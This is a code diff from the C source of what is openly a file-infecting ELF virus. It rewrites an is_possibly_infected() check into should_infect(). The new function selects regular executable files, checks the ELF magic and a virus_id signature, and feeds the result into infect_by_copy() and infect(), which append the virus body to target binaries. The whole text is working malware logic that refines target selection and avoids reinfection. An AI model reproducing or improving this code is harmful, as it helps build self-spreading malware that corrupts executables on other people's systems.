@@ -258,12 +258,21 @@ static struct io_all_result sendfile_all(int out_fd,
     return result;
 }
 
-static int is_possibly_infected(int fd) {
-    char magic[EI_NIDENT];
+static int should_infect(int fd) {
+    struct stat stat;
+    if (fstat(fd, &stat)) {
+        return -errno;
+    }
 
+    if (!S_ISREG(stat.st_mode)
+        || (stat.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH)) == 0) {
+        return 0;
+    }
+
+    char magic[EI_NIDENT];
     struct io_all_result result = pread_all(fd, magic, sizeof(magic), 0);
     if (result.remaining > 0) {
-        return -result.err;
+        return result.err ? -result.err : 1;
     }
 
     if (magic[EI_MAG0] != ELFMAG0
@@ -276,10 +285,10 @@ static int is_possibly_infected(int fd) {
     char buffer[sizeof(virus_id)];
     result = pread_all(fd, buffer, sizeof(virus_id), virus_info()->id_offset);
     if (result.remaining > 0) {
-        return -result.err;
+        return result.err ? -result.err : 1;
     }
 
-    return memcmp(virus_id, buffer, sizeof(virus_id)) == 0;
+    return memcmp(virus_id, buffer, sizeof(virus_id)) != 0;
 }
 
 static int infect_by_copy(const char *path) {
@@ -297,12 +306,9 @@ static int infect_by_copy(const char *path) {
         goto close_fd;
     }
 
-    result = is_possibly_infected(fd);
-    if (result < 0) goto close_fd;
-    if (result > 0) {
-        result = 0;
-        goto close_fd;
-    }
+    result = should_infect(fd);
+    if (result <= 0) goto close_fd;
+    result = 0;
 
     char tmp_name[] = "XXXXXX";
     int tmp_fd = mkstemp(tmp_name);
@@ -455,12 +461,9 @@ static int infect(const char *path) {
         goto close_fd;
     }
 
-    result = is_possibly_infected(fd);
-    if (result < 0) goto close_fd;
-    if (result > 0) {
-        result = 0;
-        goto close_fd;
-    }
+    result = should_infect(fd);
+    if (result <= 0) goto close_fd;
+    result = 0;
 
     result = posix_fallocate(fd, stat.st_size, info->size);
     if (result) {
